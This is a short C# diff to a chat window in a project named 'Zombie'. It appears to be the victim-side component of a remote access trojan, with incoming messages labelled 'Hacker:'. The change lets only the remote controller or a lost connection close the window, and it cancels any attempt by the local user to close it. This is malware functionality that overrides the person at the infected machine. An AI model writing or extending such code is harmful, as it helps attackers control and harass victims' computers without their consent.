@@ -23,21 +23,34 @@ namespace Zombie
         public static bool IsOpen = false;
         private string id;
         private bool firstMsg = true;
+        private bool requestedClose = false;
 
         public ChatForm(string id)
         {
             IsOpen = true;
             this.id = id;
+            Client.ConnectionFailed += OnCloseRequest;
+            FunctionManager.ChatCloseRequest += OnCloseRequest;
             FunctionManager.MessageReceived += OnMessageReceived;
             InitializeComponent();
+        }
+
+        private void OnCloseRequest(object sender, EventArgs e)
+        {
+            Invoke(new MethodInvoker(() =>
+            {
+                requestedClose = true;
+                this.Close();
+            }));
         }
 
         private void OnMessageReceived(object sender, EventArgs e)
         {
             MessageArgs args = e as MessageArgs;
-            
 
-            this.Invoke(new MethodInvoker(() => {
+
+            this.Invoke(new MethodInvoker(() =>
+            {
 
                 if (firstMsg)
                 {
@@ -48,17 +61,26 @@ namespace Zombie
                 else
                 {
                     chatOutputTextBox.AppendText(Environment.NewLine + "Hacker: " + args.Message);
-                   
+
                 }
-            
+
             }));
 
         }
 
         private void ChatForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            FunctionManager.MessageReceived -= OnMessageReceived;
-            IsOpen = false;
+            if (requestedClose)
+            {
+                FunctionManager.MessageReceived -= OnMessageReceived;
+                FunctionManager.ChatCloseRequest -= OnCloseRequest;
+                Client.ConnectionFailed -= OnCloseRequest;
+                IsOpen = false;
+            }
+            else
+            {
+                e.Cancel = true;
+            }
         }
 
         private void chatInputTextBox_KeyDown(object sender, KeyEventArgs e)
@@ -75,7 +97,7 @@ namespace Zombie
                 {
                     chatOutputTextBox.AppendText(Environment.NewLine + "Me: " + text);
                 }
-                
+
                 Client.Send(ChatMessage.Create(text, id));
                 chatInputTextBox.Text = "";
                 e.Handled = true;
